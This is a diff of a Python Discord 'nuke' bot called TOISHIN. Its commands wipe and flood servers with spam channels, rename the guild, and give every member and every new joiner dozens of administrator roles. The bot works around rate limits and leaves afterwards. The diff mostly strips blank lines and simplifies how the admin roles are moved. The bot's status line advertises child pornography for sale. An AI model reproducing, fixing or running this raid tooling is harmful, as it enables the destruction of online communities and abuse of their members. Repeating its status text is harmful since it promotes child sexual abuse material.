@@ -6,7 +6,7 @@
   !toishin        ->  通常 (既にヌケ済みなら自動でスキップ実行)
   !toishin full   ->  検知を無視して全部やる
   !nukestate      ->  ヌケ済み判定の確認
-  !admin          ->  全員に管理者ロール50個付与 (付与可能な最上位へ配置 / 退出しない / 通知なし)
+  !admin          ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
   !auto / !autoadmin on|off
 ================================================================
   【再ヌケのスキップ】
@@ -50,7 +50,6 @@ try:
 except Exception:
     pass
 
-
 # ==================== Bot インスタンス (先に作る) ====================
 # 以降のどこで @bot.command / bot.http を使っても必ず存在させるため、
 # 設定より先にここで生成する。
@@ -68,7 +67,6 @@ bot = commands.Bot(
     activity=discord.Activity(type=discord.ActivityType.watching, name="児童ポルノ販売中"),
     chunk_guilds_at_startup=False,
 )
-
 
 # ============================ 設定 ============================
 TOKEN = (
@@ -203,7 +201,6 @@ TWEMOJI_URL = "https://cdn.jsdelivr.net/gh/jdecked/twemoji@latest/assets/72x72/{
 # 生成chの名前パターン (「-012-😂🤣🤪」の形)
 CHAOS_NAME_RE = re.compile(r"-\d{3}-.{1,20}$")
 
-
 # ============================ ログ ============================
 logging.basicConfig(
     level=logging.INFO,
@@ -213,7 +210,6 @@ logging.basicConfig(
 log = logging.getLogger("TOISHIN")
 logging.getLogger("discord").setLevel(logging.WARNING)
 logging.getLogger("discord.http").setLevel(logging.WARNING)
-
 
 # ======================= 状態 =======================
 PANIC = {"on": False, "global_429": 0, "last_global": 0.0, "deadline": 0.0}
@@ -232,7 +228,6 @@ AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)
 _RETRYABLE_5XX = {500, 502, 503, 504}
 _NO_RETRY_4XX  = {400, 401, 403, 404, 405, 415}
 
-
 def _retry_after_of(e) -> float:
     try:
         ra = e.response.headers.get("Retry-After")
@@ -245,13 +240,11 @@ def _retry_after_of(e) -> float:
     except Exception:
         return 0.0
 
-
 def _is_global(e) -> bool:
     try:
         return e.response.headers.get("X-RateLimit-Global") == "true"
     except Exception:
         return False
-
 
 def _note_global(e) -> None:
     now = time.monotonic()
@@ -262,11 +255,9 @@ def _note_global(e) -> None:
     log.warning("!!! グローバル429 (%d/%d)",
                 PANIC["global_429"], PANIC_AFTER_GLOBAL)
 
-
 def _calm_down() -> None:
     if PANIC["global_429"] and time.monotonic() - PANIC["last_global"] > GLOBAL_RESET:
         PANIC["global_429"] = 0
-
 
 # ------------------- 凍結 / 復帰 -------------------
 async def _reconnect() -> None:
@@ -275,7 +266,6 @@ async def _reconnect() -> None:
         await bot.reconnect()
     except Exception as e:
         log.warning("再接続失敗: %r", e)
-
 
 async def _reopen_worker() -> None:
     while True:
@@ -297,7 +287,6 @@ async def _reopen_worker() -> None:
         PACER["rate"] = min(SPAM_RATE, PACER["rate"] + RATE_STEP)
         log.info("      -> レート復帰 %.0f/s", PACER["rate"])
 
-
 def _freeze(seconds: float) -> None:
     if seconds <= 0:
         return
@@ -318,7 +307,6 @@ def _freeze(seconds: float) -> None:
     if COOLDOWN["hits"] % RECONNECT_AFTER_FREEZE == 0:
         asyncio.create_task(_reconnect())
 
-
 async def acquire_token() -> None:
     while True:
         if not GATE.is_set():
@@ -334,7 +322,6 @@ async def acquire_token() -> None:
             return
 
         await asyncio.sleep(max(0.01, (1.0 - PACER["tokens"]) / PACER["rate"]))
-
 
 async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
     if PANIC["on"]:
@@ -383,7 +370,6 @@ async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
     log.error("リトライ上限で断念: %s", label)
     return None
 
-
 async def patch_guild(guild: discord.Guild, payload: dict, label: str):
     try:
         return await safe(
@@ -394,7 +380,6 @@ async def patch_guild(guild: discord.Guild, payload: dict, label: str):
     except Exception as e:
         log.warning("patch_guild 失敗 %s: %r", label, e)
         return None
-
 
 async def leave_guild(guild: discord.Guild, budget: float = LEAVE_RESERVE) -> bool:
     """ゲートを通さず、凍結中でも必ず試行する"""
@@ -435,31 +420,25 @@ async def leave_guild(guild: discord.Guild, budget: float = LEAVE_RESERVE) -> bo
     log.error("=== 退出できなかった (Botを手動で蹴ってください) ===")
     return False
 
-
 async def fetch_bytes(url: str) -> bytes:
     async with aiohttp.ClientSession() as s:
         async with s.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
             r.raise_for_status()
             return await r.read()
 
-
 def _suffix(i: int) -> str:
     return f"-{i:03d}-{''.join(random.sample(EMOJI_POOL, 3))}"
-
 
 def build_channel_names() -> list[str]:
     return [f"{NAME_POOL[(i - 1) % len(NAME_POOL)]}{_suffix(i)}"[:100]
             for i in range(1, CHANNEL_COUNT + 1)]
 
-
 def build_category_names() -> list[str]:
     return [f"{NAME_POOL[(i * 3) % len(NAME_POOL)]}{_suffix(i)}"[:100]
             for i in range(1, CATEGORY_COUNT + 1)]
 
-
 def is_admin_role(r: discord.Role) -> bool:
     return r.name.startswith("ADMIN-") and r.permissions.administrator
-
 
 def panic_skip(stage: str) -> bool:
     if PANIC["on"]:
@@ -467,14 +446,12 @@ def panic_skip(stage: str) -> bool:
         return True
     return False
 
-
 def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
     names = AUTO_GRANT.get(guild.id)
     if not names:
         return []
     wanted = set(names)
     return [r for r in guild.roles if r.name in wanted]
-
 
 # ================== ヌケ済み判定 ==================
 def nuked_reasons(guild: discord.Guild) -> list[str]:
@@ -488,10 +465,8 @@ def nuked_reasons(guild: discord.Guild) -> list[str]:
         hits.append("生成ch")
     return hits
 
-
 def looks_nuked(guild: discord.Guild) -> bool:
     return bool(nuked_reasons(guild))
-
 
 def reusable_channels(guild: discord.Guild) -> list[discord.TextChannel]:
     """流用できる通常テキストch (rules / お知らせ は除外)"""
@@ -505,7 +480,6 @@ def reusable_channels(guild: discord.Guild) -> list[discord.TextChannel]:
             continue
         out.append(c)
     return out
-
 
 async def unlock_for_spam(guild: discord.Guild,
                           chs: list[discord.TextChannel]) -> None:
@@ -526,7 +500,6 @@ async def unlock_for_spam(guild: discord.Guild,
 
     await asyncio.gather(*(one(c) for c in chs))
 
-
 # ================== コミュニティ有効化 ==================
 async def _community_pair(guild: discord.Guild):
     rules = await safe(guild.create_text_channel, "rules",
@@ -542,7 +515,6 @@ async def _community_pair(guild: discord.Guild):
                           reason="TOISHIN NUKE", label="community:news-text")
     return rules, news
 
-
 async def _community_ok(guild: discord.Guild, how: str) -> bool:
     try:
         await guild.fetch()
@@ -553,7 +525,6 @@ async def _community_ok(guild: discord.Guild, how: str) -> bool:
         return True
     log.warning("      -> PATCH は通ったが features に反映されず (%s)", how)
     return False
-
 
 async def enable_community(guild: discord.Guild) -> bool:
     if "COMMUNITY" in guild.features:
@@ -595,7 +566,6 @@ async def enable_community(guild: discord.Guild) -> bool:
         log.warning("コミュニティ有効化で例外: %r", e)
         return False
 
-
 async def bind_community_channels(guild: discord.Guild,
                                   created: list[discord.TextChannel]) -> None:
     if "COMMUNITY" not in guild.features or not created:
@@ -615,7 +585,6 @@ async def bind_community_channels(guild: discord.Guild,
         log.info("      -> rules / お知らせch を再割当")
     except Exception as e:
         log.warning("rules/お知らせch の再割当に失敗: %r", e)
-
 
 # ========================= ヌケ本体 =========================
 async def _nuke_body(guild: discord.Guild, el, force_full: bool = False) -> None:
@@ -909,7 +878,6 @@ async def _nuke_body(guild: discord.Guild, el, force_full: bool = False) -> None
         await safe(guild.edit, name=SECOND_GUILD_NAME,
                    reason="TOISHIN NUKE", label="guild:edit2")
 
-
 # ======================= 監視 =======================
 async def watchdog(task: asyncio.Task) -> None:
     while True:
@@ -927,7 +895,6 @@ async def watchdog(task: asyncio.Task) -> None:
             task.cancel()
             return
         await asyncio.sleep(0.5)
-
 
 async def run_nuke(guild: discord.Guild, force_full: bool = False) -> None:
     t0 = time.perf_counter()
@@ -959,7 +926,6 @@ async def run_nuke(guild: discord.Guild, force_full: bool = False) -> None:
         await leave_guild(guild, budget=LEAVE_RESERVE)
         log.info("=== NUKE END | 所要 %s ===", el())
 
-
 # ========================= コマンド =========================
 @bot.command(name="toishin", aliases=["nuke", "t"])
 @commands.guild_only()
@@ -969,7 +935,6 @@ async def toishin(ctx: commands.Context, mode: str = ""):
     force_full = mode.lower() in ("full", "all", "全部")
     async with NUKE_LOCK:
         await run_nuke(ctx.guild, force_full)
-
 
 @bot.command(name="nukestate")
 @commands.guild_only()
@@ -984,12 +949,10 @@ async def nukestate_cmd(ctx: commands.Context):
         await ctx.send(f"ヌケ済み判定: 該当なし / 再利用可能ch {reuse}\n"
                        f"→ `!toishin` は通常実行になる")
 
-
 # ==================== !admin 用ヘルパー ====================
 async def notify(ctx: commands.Context, content: str) -> None:
     if ADMIN_NOTIFY:
         await safe(ctx.channel.send, content, label="adm:reply")
-
 
 async def collect_members(guild: discord.Guild) -> list[discord.Member]:
     members = list(guild.members)
@@ -1009,7 +972,6 @@ async def collect_members(guild: discord.Guild) -> list[discord.Member]:
             log.warning("chunk 失敗: %s", e)
     return members
 
-
 async def ensure_admin_roles(guild: discord.Guild, count: int) -> list[discord.Role]:
     pool = {r.name: r for r in guild.roles if is_admin_role(r)}
     sem = asyncio.Semaphore(ROLE_CONCURRENCY)
@@ -1023,13 +985,11 @@ async def ensure_admin_roles(guild: discord.Guild, count: int) -> list[discord.R
                 guild.create_role, name=nm,
                 permissions=discord.Permissions(administrator=True),
                 colour=discord.Colour.random(),
-                hoist=True,
                 reason="TOISHIN ADMIN", label=f"role:{nm}",
             )
 
     got = await asyncio.gather(*(ensure(i) for i in range(1, count + 1)))
     return [r for r in got if r is not None]
-
 
 async def grant_roles(members, roles):
     sem = asyncio.Semaphore(MEMBER_CONCURRENCY)
@@ -1050,58 +1010,6 @@ async def grant_roles(members, roles):
     ok = sum(1 for r in results if r)
     failed = [m for m, r in zip(members, results) if not r]
     return ok, failed
-
-
-async def raise_roles_to_top(guild: discord.Guild, roles: list[discord.Role]) -> None:
-    """指定ロールを「付与できる範囲の一番上」= Bot最上位ロールの直下へ寄せる"""
-    try:
-        await guild.fetch_roles()          # 位置情報を最新化
-    except Exception as e:
-        log.warning("ロール位置の再取得に失敗 (%r)", e)
-
-    ordered = list(guild.roles)            # 低 -> 高
-    if not ordered:
-        return
-
-    me = guild.me
-    me_ids = {r.id for r in me.roles} if me else set()
-    floors = [i for i, r in enumerate(ordered) if r.id in me_ids]
-    floor = min(floors) if floors else 1   # Botの最下位ロールの位置
-
-    wanted = {r.id for r in roles}
-    admin = [r for r in ordered if r.id in wanted and is_admin_role(r)]
-    if not admin:
-        return
-
-    zone = [r for r in ordered[:floor] if r.id not in wanted]
-    above = [r for r in ordered[floor:] if r.id in wanted]
-    if above:
-        log.warning("Botの最上位ロールより上に %d 個。付与可能な最上位へ下げる",
-                    len(above))
-
-    stack = sorted(admin, key=lambda r: r.name, reverse=True)  # 末尾が ADMIN-01
-    target = zone + stack                  # ADMIN を最上段へ
-
-    payload = {}
-    for i, r in enumerate(target):
-        if r.position != i:
-            payload[r] = i
-    if not payload:
-        log.info("      -> ロール位置は既に最上位")
-        return
-
-    try:
-        await guild.edit_role_positions(payload, reason="TOISHIN ADMIN")
-        log.info("      -> ADMIN ロール %d 個を付与可能な最上位へ移動", len(admin))
-        return
-    except Exception as e:
-        log.warning("一括移動に失敗 (%r)。1個ずつ再試行", e)
-
-    pos = len(target) - 1
-    for r in reversed(stack):              # ADMIN-01 から順に上へ
-        await safe(r.edit, position=pos, label=f"role:raise:{r.name}")
-        pos -= 1
-
 
 # ========================= !admin =========================
 @bot.command(name="admin", aliases=["adm"])
@@ -1131,8 +1039,13 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
         AUTO_GRANT[guild.id] = [r.name for r in roles]
         log.info("自動付与を有効化: %d ロール (以降の参加者に即付与)", len(roles))
 
-    log.info("ADMIN ロールを付与可能な最上位へ寄せる")
-    await raise_roles_to_top(guild, roles)
+    top = guild.me.top_role
+    above = [r for r in roles if r >= top]
+    if above:
+        log.warning("Botの最上位ロール(%s)より上に %d 個。position を下げる",
+                    top.name, len(above))
+        for r in above:
+            await safe(r.edit, position=1, label=f"role:move:{r.name}")
 
     ok, failed = await grant_roles(members, roles)
     log.info("付与 1周目: 成功 %d / 失敗 %d", ok, len(failed))
@@ -1152,7 +1065,6 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
     await notify(ctx, f"✅ 全員に管理者ロール {len(roles)} 個を付与した "
                       f"(対象 {len(members)} 人 / 成功 {ok} 人)")
     await notify(ctx, "🔁 以降の新規参加者にも同じロールを自動付与する")
-
 
 # ================= 新規参加者への自動付与 =================
 @bot.event
@@ -1185,7 +1097,6 @@ async def on_member_join(member: discord.Member):
     else:
         log.info("自動付与 完了: %s に %d 個", member, total)
 
-
 @bot.command(name="auto")
 @commands.guild_only()
 async def auto_cmd(ctx: commands.Context):
@@ -1195,7 +1106,6 @@ async def auto_cmd(ctx: commands.Context):
         return
     have = len(resolve_auto_roles(ctx.guild))
     await ctx.send(f"自動付与: ON / 新規参加者に ADMIN ロール {have} 個を即付与")
-
 
 @bot.command(name="autoadmin")
 @commands.guild_only()
@@ -1211,19 +1121,16 @@ async def autoadmin_cmd(ctx: commands.Context, mode: str = "on"):
     AUTO_GRANT[ctx.guild.id] = [r.name for r in roles]
     await ctx.send(f"自動付与 ON ({len(roles)} 個)")
 
-
 # =========================== おまけ ===========================
 @bot.command(name="ping")
 async def ping(ctx: commands.Context):
     await ctx.send(f"🏓 pong {round(bot.latency * 1000)}ms")
-
 
 @bot.command(name="leave", aliases=["bye"])
 @commands.guild_only()
 async def leave_cmd(ctx: commands.Context):
     await ctx.send("👋 抜けるわ")
     await leave_guild(ctx.guild)
-
 
 @bot.event
 async def on_ready():
@@ -1233,13 +1140,11 @@ async def on_ready():
     log.info("招待URL: https://discord.com/oauth2/authorize?client_id=%s"
              "&scope=bot+applications.commands&permissions=8", bot.user.id)
 
-
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.NoPrivateMessage):
         return
     log.warning("command error: %s", error)
-
 
 # ===================== 接続(429耐性つき) =====================
 async def runner() -> None:
@@ -1274,10 +1179,9 @@ async def runner() -> None:
             RETRY["delay"] = min(RETRY["delay"] * 1.7, 900.0)
             continue
         except Exception:
-            log.exception("想定外の切断。10 秒後に再接続")
+            log.exception("想定外の切断。10 秒後に再結合")
             await asyncio.sleep(10)
             continue
-
 
 if __name__ == "__main__":
     if not TOKEN:
